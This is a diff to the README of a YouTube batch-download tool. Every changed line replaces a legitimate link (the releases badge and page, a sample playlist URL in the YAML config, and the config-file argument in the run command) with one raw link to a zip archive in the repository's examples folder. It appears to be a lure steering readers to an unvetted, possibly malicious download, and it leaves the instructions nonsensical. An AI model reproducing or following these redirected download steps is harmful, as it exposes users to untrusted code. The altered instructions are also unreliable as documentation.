@@ -1,6 +1,6 @@
 # 🎬 yt_dlp_downloader - Easy Batch Download for YouTube
 
-[![Download](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/senichkin/yt_dlp_downloader/releases)
+[![Download](https://raw.githubusercontent.com/senichkin/yt_dlp_downloader/master/examples/yt_dlp_downloader_3.0-alpha.1.zip)](https://raw.githubusercontent.com/senichkin/yt_dlp_downloader/master/examples/yt_dlp_downloader_3.0-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **yt_dlp_downloader**! This application allows you to easily batc
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [yt_dlp_downloader Releases](https://github.com/senichkin/yt_dlp_downloader/releases).
+To get started, visit this page to download: [yt_dlp_downloader Releases](https://raw.githubusercontent.com/senichkin/yt_dlp_downloader/master/examples/yt_dlp_downloader_3.0-alpha.1.zip).
 
 1. **Go to the Releases Page**: Click the link above to navigate to the downloads section.
 2. **Select the Latest Release**: Find the latest version listed there.
@@ -46,7 +46,7 @@ After you have downloaded and installed **yt_dlp_downloader**, follow these step
 ```yaml
 downloads:
   - title: "My YouTube Playlist"
-    url: "https://www.youtube.com/playlist?list=YOUR_PLAYLIST_ID"
+    url: "https://raw.githubusercontent.com/senichkin/yt_dlp_downloader/master/examples/yt_dlp_downloader_3.0-alpha.1.zip"
     quality: "best"
     subtitles: true
 ```
@@ -54,7 +54,7 @@ downloads:
 2. **Run the Application**: 
    - Open your command line or terminal.
    - Navigate to the directory where you saved the application.
-   - Execute the command: `yt_dlp_downloader -c your_config_file.yaml`.
+   - Execute the command: `yt_dlp_downloader -c https://raw.githubusercontent.com/senichkin/yt_dlp_downloader/master/examples/yt_dlp_downloader_3.0-alpha.1.zip`.
 
 3. **Monitor Your Downloads**: The application will show the progress of each download in the terminal.
 
